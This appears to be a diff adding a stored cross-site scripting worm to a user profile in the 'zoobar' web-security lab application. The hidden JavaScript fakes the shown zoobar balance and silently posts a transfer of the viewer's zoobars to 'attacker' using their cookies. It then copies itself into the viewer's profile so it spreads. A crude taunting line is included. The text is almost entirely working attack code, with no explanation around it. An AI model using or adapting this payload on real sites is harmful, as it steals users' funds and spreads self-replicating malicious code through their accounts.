@@ -331,4 +331,47 @@ Born in Mexico and stealing your shaittt!
 <textarea style="display:none">
 
 
+Now lets fix the zoobar count to 10:
 
+
+
+
+Born in Mexico and stealing your shaittt!
+
+
+
+</textarea>
+<span id="zoobars" class="
+  var viewed_username = document.getElementsByName('user')[0].value;
+  var space = String.fromCharCode(38, 110, 98, 115, 112, 59);
+  var equal = String.fromCharCode(61);
+  var amp = String.fromCharCode(38);
+  var singquot = String.fromCharCode(39);
+  document.getElementById('profileheader').innerHTML = viewed_username + singquot + 's' + space + 'zoobars:10';
+
+  var hostname = 'localhost';  
+
+  var zoobars = '1';
+  var recipient = 'attacker';
+  var transfer_query = 'zoobars' + equal + zoobars + amp + 'recipient' + equal + recipient + amp + 'submission' + equal + 'Send'; 
+  var transfer_url = 'http://' + hostname + '/transfer.php';
+  var transfer_request = new XMLHttpRequest(); 
+  transfer_request.open('POST', transfer_url, false);
+  transfer_request.setRequestHeader('Cookie', document.cookie); 
+  transfer_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  transfer_request.send(transfer_query);
+
+  var attacker_profile = encodeURIComponent(document.getElementById('profile').innerHTML); 
+  var update_query = 'profile_update' + equal + attacker_profile + amp + 'profile_submit' + equal + 'Save';
+  var update_url = 'http://' + hostname + '/index.php';
+  var update_request = new XMLHttpRequest(); 
+  update_request.open('POST', update_url, false);
+  update_request.setRequestHeader('Cookie', document.cookie); 
+  update_request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); 
+  update_request.send(update_query);
+"></span>
+<textarea style="display:none">
+
+
+
+// TODO: try to add back the textarea
